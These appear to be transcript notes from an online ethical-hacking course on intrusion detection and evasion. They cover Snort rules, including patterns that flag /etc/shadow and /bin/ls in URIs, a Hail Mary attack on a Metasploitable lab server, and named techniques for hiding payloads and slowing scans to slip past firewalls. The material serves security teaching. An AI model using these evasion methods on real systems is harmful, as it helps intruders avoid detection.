> **[1:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=97)** In either case, the logs are written to the default location, var/logs/snort/.
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=104)** Alternatively, and much more usefully, the logs can be directed to the host syslog file using the output configuration, alert_syslog.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=113)** This can be also be sent to a remote syslog server using the local three configuration.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=118)** This enables logs to be protected in the even of a compromise of the host.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=123)** It's easy to get Snort up and running in Kali.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=126)** Let's use the apt-get installation process to load it.
>
> **[2:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=134)** Okay, it's installed.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=136)** We can check it's working by display its version.
>
> **[2:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=142)** Let's take a look at what a rule looks like.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=145)** I have a file called rules which contains two Snort rules.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=152)** The first rule starts with the keyword, log, and tells Snort this is a log entry.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=158)** It then indicates that only TCP packets should be examined against this rule.
>
> **[2:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=163)** The next clause defines the source IP address and port and the destination IP address and port.
>
> **[2:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=170)** In this case, the rule is relevant to traffic coming from our subnet and going out to any server on ports 80 or 443.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=178)** The remainder of the rule is the rule body which has the matching logic.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=182)** In this case, we're providing a message which says staff online shopping notice and the rule is triggered when the URI contains the text, [ebay.com](https://ebay.com).
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=193)** The sid is the unique rule identifier.
>
> **[3:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=196)** The second rule is a bit more complicated.
>
> **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=198)** It starts with the keyword, alert, indicating this is to cause a real-time alert if it's triggered.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=205)** It's relevant to anything directed to our subnet on any port.
>
> **[3:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=209)** The body shows a message that Snort has detected a Code Red attack.
>
> **[3:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=213)** The traffic flow is to the server on an established connection and contains the text, root.exe, in the URI.
>
> **[3:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=221)** The rule is not case sensitive and it's categorized as a web application attack.
>
> **[3:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=226)** The reference field is used to provide additional information for the alert.
>
> **[3:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=230)** In this case, a reference to the CVE report relevant to the malware.
>
> **[3:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=236)** Again, we have the sid and the revision of the rule.
>
> **[4:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=240)** Snort comes with a significant number of rules.
>
> **[4:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=246)** These individual rule files are all included into the snort.conf file, which is loaded when Snort starts.
>
> **[4:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=254)** Let's look at one of them.
>
> **[4:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=265)** Here we can see rules checking for various files in the URI, such as /bin/ls and /etc/shadow, which indicates a Command Injection attack.
>
> **[4:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=278)** We can modify the snort.conf file to include our rules.
>
> **[4:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=294)** Snort can be run in test mode to check that the rule constriction is valid.
>
> **[4:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=298)** This is useful if we've created some new rules which we want to check.
>
> **[5:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=309)** And we can see that all the rules, including the ones we added, are valid.
>
> **[5:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/snort-rules?u=76281980&t=314)** It's important to understand Snort and the Snort rule construction because Snort is used as the underlying detection agent for a number of commercial products and its rules tend to be the standard for many products.

> [!info]- Semantic Content
>
> **Code Keywords:** case, (4), let (3), var (1), protected (1)
> **Env Vars:** uri (3), ids (2), acid (1), tcp (1), cve (1)
> **CLI Commands:** make (1), apt (1), ls (1)
> **Code Identifiers:** alert_fast (1), alert_full (1), alert_syslog (1)
> **Definitions:** is a  (3)
> **URLs:** [ebay.com](https://ebay.com) (1)
> **Analogies:** such as (1)
> **Prerequisites:** setup (1)

#### Detect intrusions with Security Onion
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=0)** - [Instructor] Network intrusion detection systems occur on the perimeter as well as inside networks and their purpose is to detect threats by monitoring network traffic.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=10)** There are both opensource and commercial solutions available.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=13)** Intrusion detection systems work either by detecting exploit in malware signatures or by detecting behavior that looks anomalous or maybe associated with an intrusion.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=24)** Snort is an opensource intrusion detection system which has been the genesis of many of the intrusion detection systems available today and Snort rules are accepted as an industry standard for configuring intrusion detection systems.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=39)** It's a command line tool and uses signatures as well as anomaly detection.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=44)** Suricata is a development that came from the U.S. Department of Homeland Security funding as a contemporary alternative to Snort and is well-regarded also.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=53)** The tool we're going to look at is called Security Onion.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=57)** This is a Ubuntu idea which combines the best of Snort, Suricata, and other IDS initiatives and provides a comprehensive intrusion detection, network security monitoring, and log management solution.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=70)** The download link points to GitHub and we can get the latest ISO image from there.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=75)** I'll create a new Ubuntu 64-bit virtual machine and configure it with two gigabytes of RAM and 20 gig VDI hard disk.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=95)** I'll increase its video memory to 32 megabyte.
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=102)** I'll go into Network Configuration and set NAT network and click on Advanced to allow promiscuous mode.
>
> **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=117)** And I'll go into the storage configuration and put the ISO image in the CD drive.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=131)** Okay, let's start it up and install Security Onion.
>
> **[2:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=135)** I'll take the default English language and click Continue.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=139)** I'll check download updates and continue.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=144)** I'll accept the option to erase disk and install and I'll press Continue.
>
> **[2:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=149)** I'll continue with the rest of the operating system installation now.
>
> **[2:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=153)** When the menu's installed, we'll be prompted to restart.
>
> **[2:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=156)** After I log in, the system restarts with the Security Onion graphical interface.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=161)** At the top left we see we have the main menu which provides, amongst other things, a browser and terminal.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=167)** You'll need to run the Security Onion tools in full-screen mode, which you can do by installing the VirtualBox Guest Additions.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=174)** The CD is available under Devices, Insert Guest Additions CD Image.
>
> **[2:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=179)** This needs to run in privileged mode, so I'll do that from a terminal.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=182)** I'll start by mounting the CD.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=199)** To install this, we'll use shell to run VBoxLinuxAdditions.run.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=205)** Okay, let's reboot to activate this.
>
> **[3:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=207)** We can do this by pressing right Control + H.
>
> **[3:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=213)** Okay, we can now start the Security Onion setup process by executing the setup icon.
>
> **[3:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=229)** We can enter a static IP address here.
>
> **[4:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=250)** Once we've done this, we'll be prompted to reboot and we'll do that.
>
> **[4:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=254)** Okay, we can select setup again
>
> **[4:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=263)** and we'll select evaluation mode.
>
> **[4:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=267)** We'll also setup our Sguil username and password and then continue.
>
> **[4:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=283)** Okay, we now have our tools installed and operational.
>
> **[4:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=287)** I'm not going to spend a great deal of time looking at the full IDS features of Security Onion, but let's use one of its tools to see how an IDS works.
>
> **[4:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=294)** I'll start up Sguil and authenticate to it.
>
> **[5:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=302)** I'll activate both interfaces and start monitoring.
>
> **[5:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=306)** I've got Kali running and I have Arimitage up and waiting to go.
>
> **[5:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=310)** I'll select the Metasploitable server and launch a Hail Mary attack.
>
> **[5:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=319)** Back in Sguil, I can now see the attack packet's being detected and alerted in real time.
>
> **[5:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=325)** Security Onion is a comprehensive product with many more features and you can usefully experiment further to determine what attacks it detects and what slip under the radar.
>
> **[5:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/detect-intrusions-with-security-onion?u=76281980&t=335)** From a testing perspective, it's useful to be able to identify and demonstrate areas of weakness in whatever IDS solutions exist in your target environment.

> [!info]- Semantic Content
>
> **Code Keywords:** continue (5), let (3), this, (2), interface (1), this. (1)
> **Env Vars:** ids (4), iso (2), ram (1), vdi (1), nat (1)
> **Prerequisites:** setup (4), install (3), configure (1), you'll need (1)
> **Definitions:** is a  (3), is an  (1), is called (1)
> **CLI Commands:** cd (4)
> **Tools:** terminal (2), command line (1), github (1)
> **UI Navigation:** click on (1), select the (1)
> **Speakers:** - [instructor] (1)

#### Extend IDS with reputation
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=1)** - [Instructor] Reputation is another technique in combating malicious activities.
>
> **[0:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=5)** It's a logical extension of threat intelligence in which the collective intelligence is able to provide a reputational feed to devices to complement the signature-based ID as feeds.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=16)** AT&T has for many years been providing reputation-based threat intelligence through its AlienVault Open Threat Exchange Reputation Monitor Service.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=26)** The reputational information collected by AlienVault can be used to provide automated endpoints and system risk detection using two free tools from AlienVault, Endpoint Security and Spiceworks Threat Alerts.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=40)** Cisco's Talos promotes itself as the world's most comprehensive real-time threat detection network with its databases providing actionable intelligence.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=51)** An example of how this works can be seen with the Cisco Intrusion Detection Systems which take advantage of information feeds from Cisco's Security Intelligence Operations.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=61)** The collective nature of widespread event correlation is very powerful as it provides information to the intrusion detection systems about IP addresses that have been associated with malicious or risky websites.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=75)** The Threat Operation Center constantly gathers and analyzes data on malicious activity using automated and human interaction methods.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=84)** The gathered data populates the Cisco SensorBase database.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=89)** Participants can contribute to the global correlation database and benefit from the collective information it maintains.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=96)** It says, in identified event, the intrusion detection system will send information.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=101)** This includes signature ID, attacker's IP address and port, the victim's IP address and port, TCP options string, and reputation rating and score from the sensor health metrics.
>
> **[1:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=114)** The reputation service update the database and customer sensors can be configured to automatically download updates from the global correlation service at regular intervals.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=126)** McAfee offers similar capability in their network security platform with the global threat intelligence server.
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=133)** This server obtains real-time reputational ratings including those relating to email messages, IP addresses, and URLs and uses these to drop a quarantine traffic.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/extend-ids-with-reputation?u=76281980&t=144)** Reputation-based intrusion detection is a powerful feature that can help prevent threats from malware and zero-day attacks by sharing collective intelligence.

> [!info]- Semantic Content
>
> **Env Vars:** tcp (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### EINSTEIN
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=1)** - [Instructor] Einstein was developed by the US Computer Emergency Readiness Team as an intrusion detection system for monitoring the network gateways of government departments and agencies for unauthorized traffic.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=13)** It was intended to provide situational awareness of network threats.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=18)** Einstein was designed to be the primary cybersecurity system that would provide four major security capabilities to the federal government: intrusion detection, intrusion prevention, data analytics, and information sharing.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=34)** The first version of Einstein, Einstein 1, was deployed in 2004 and was limited to monitoring traffic flows.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=42)** In 2008, Einstein 2 was released with an enhanced capability of checking content.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=50)** By 2010, the Department of Homeland Security was planning for the design and development of Einstein 3.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=56)** This would be an intrusion prevention capability which could identify and block cyber attacks.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=62)** It would use classified signatures to protect government networks.
>
> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=66)** However, with the advanced capabilities that were being planned, concerns were starting to be voiced as to whether the program was invading individual privacy.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=77)** Einstein was budgeted at $5.7 billion but it wasn't embraced with enthusiasm.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=84)** By 2008, Einstein was being deployed in just 15 of the target 600 agencies.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=90)** In 2015, Einstein spectacularly missed the Office of Personnel Management data breach which exposed 21 million federal employee records.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=100)** The US Government Accountability Office audited the program in 2016 and reported that it was unfit to prevent data breaches in the federal government.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=111)** Einstein had failed.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=113)** There were three key reasons why it failed.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=116)** Its detection technology was at least 15 years behind industry capability using purely signature-based IDS and no anomaly capability.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=126)** Einstein just plain couldn't detect common problems.
>
> **[2:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=130)** 489 known security vulnerabilities were tested and Einstein was only able to detect 29, a 6% accuracy rate.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=139)** In other words, it offered a horrendous false negative rate of 94%.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=145)** Einstein failed to get agency support.
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=147)** In the end, only five agencies had fully deployed it.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/einstein?u=76281980&t=152)** The final testament to Einstein was made by the Obama Administration comparing it to an Atari game in an Xbox world.

> [!info]- Semantic Content
>
> **Env Vars:** ids (1)
> **Versions:** 5.7 (1)
> **Definitions:** in other words (1)
> **Speakers:** - [instructor] (1)


### 6. Evasion Techniques

#### Evading antivirus detection
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=1)** - [Instructor] As organizations acquire and deploy cybersecurity technologies to detect attack, adversaries at the same time are analyzing those same technologies to find ways to avoid being detected by them.
>
> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=13)** As a pen tester, it's important to be able to use evasive techniques to test how effective an organization is in detecting such attacks.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=21)** We'll have a look at three different aspects of evasion.
>
> **[0:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=25)** The first is to evade detection.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=28)** There are many ways that a hacker will use to avoid being detected by an intrusion detection or prevention system.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=34)** We'll look at how we can use msfvenom to hide payloads with obfuscation or encryption.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=41)** Custom packaging is also a technique used to defeat malware signature checks.
>
> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=47)** The second aspect of evasion is for the malware to avoid detection after it penetrates the target.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=53)** One way is to directly execute in memory, an approach known as fileless malware.
>
> **[0:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=58)** Another way is to hide using undocumented or little known features of the operating system, such as by using cloaking, and by embedding malware in an alternate data stream.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=70)** The final aspect of evasion is making analysis difficult by detecting oversight and taking countermeasures.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=77)** Malware will often use anti-virtualization and anti-sandboxing techniques for this.

> [!info]- Semantic Content
>
> **CLI Commands:** find (1)
> **Code Keywords:** this. (1)
> **Definitions:** known as (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)

#### Exotic scanning with Nmap
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=1)** - [Instructor] Nmap is often used to run a scan of the ports on a target.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=4)** Internet connected systems are required by the internet standard RFC 793 to send a negative response to unexpected connections in the form of a TCP reset packet.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=17)** This makes it easy for Nmap to recognize closed ports.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=21)** When scanning through a firewall, packets destined for a disallowed port will either be dropped or the firewall will return a port unreachable response.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=31)** These responses enable Nmap to reliably detect filtered TCP ports from open or closed ones.
>
> **[0:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=38)** However, a filtered or unreachable port doesn't always mean the port is inaccessible.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=43)** One reason a scan is detected and blocked is that it might run too fast.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=48)** Let's use Nmap to scan our Kali-eminence server on 192.168.1.187.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=53)** And we get a pretty quick response with the open ports.
>
> **[1:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=63)** By slowing down the scan, we might be able to defeat the firewall if we'd been blocked.
>
